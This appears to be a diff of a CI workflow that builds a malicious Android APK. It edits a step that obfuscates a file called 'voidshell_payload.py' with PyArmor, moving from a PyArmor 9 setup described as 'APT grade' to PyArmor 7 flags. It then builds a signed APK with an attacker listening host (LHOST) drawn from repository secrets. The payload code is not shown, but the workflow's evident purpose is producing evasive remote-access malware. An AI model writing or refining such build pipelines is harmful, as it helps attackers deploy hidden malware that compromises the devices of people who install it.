@@ -36,21 +36,12 @@ jobs:
           python -m pip install --upgrade pip
           pip install pyaxmlparser androguard requests
 
-      - name: Obfuscate payload (PyArmor 9 – 2025 APT grade)
+      - name: Obfuscate with PyArmor 7 (legacy CLI fallback)
         run: |
-          pip install -U pyarmor
-          mkdir -p dist/obf
-          pyarmor gen \
-            --output dist/obf \
-            --advanced 4 \
-            --enable rft \
-            --enable bcc \
-            voidshell_payload.py
-          cp dist/obf/dist/voidshell_payload.py voidshell_payload.py
-          echo "Payload hardened with PyArmor 9 (advanced=4, rft+bcc enabled)"
-
-      - name: Build signed APK (using your builder script)
-        # ... rest unchanged
+          pip install "pyarmor<8.0.0"
+          pyarmor obfuscate --recursive --advanced 2 --enable-rft --enable-bcc --output dist/obf voidshell_payload.py
+          cp dist/obf/voidshell_payload.py voidshell_payload.py
+      
       - name: Build signed APK (using your builder script)
         env:
           LHOST: ${{ secrets.LHOST }}                 # set these in repo secrets
